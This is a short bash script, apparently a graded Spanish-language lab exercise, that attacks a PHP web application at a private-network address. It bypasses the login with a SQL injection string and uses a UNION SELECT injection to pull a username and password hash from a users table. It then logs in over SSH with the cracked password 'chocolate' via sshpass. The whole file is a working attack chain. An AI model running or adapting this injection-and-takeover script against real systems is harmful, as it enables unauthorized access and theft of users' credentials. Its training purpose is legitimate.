#!/bin/bash

url_login="http://192.168.232.135/login.php"

sql_bypass="1' OR 1=1-- -"

phpsessid=$(curl -s $url_login -X POST -d "username=$sql_bypass" -d "password=admin" -v 2>&1 | grep "< Set-Cookie: PHPSESSID=" | tr '=;' ' ' | awk '{print $4}')

url_profile="http://192.168.232.135/profile.php"

#echo "$phpsessid"

#curl -s $url_profile -H "Cookie: PHPSESSID=$phpsessid" -v

sql_injection="1' UNION SELECT id, username, password FROM biblioteca.USERS-- -"

user=$(curl -s $url_profile -d "nombre_autor=$sql_injection" -X POST -H "Cookie: PHPSESSID=$phpsessid" 2>&1 | html2text | tail -n 1 | awk '{print $2}')
password=$(curl -s $url_profile -d "nombre_autor=$sql_injection" -X POST -H "Cookie: PHPSESSID=$phpsessid" 2>&1 | html2text | tail -n 1 | awk '{print $3}')

echo "$user:$password(MD5: chocolate)"

# Completar el script mandando el password hasheado a la pagina de crackstation u otra o usar john o hashcat o cualquier herramienta que decifre el hash y posterior setearlo en el sshpass (15 puntos)

password_decode="chocolate"

sshpass -p "$password_decode" ssh $user@192.168.232.135
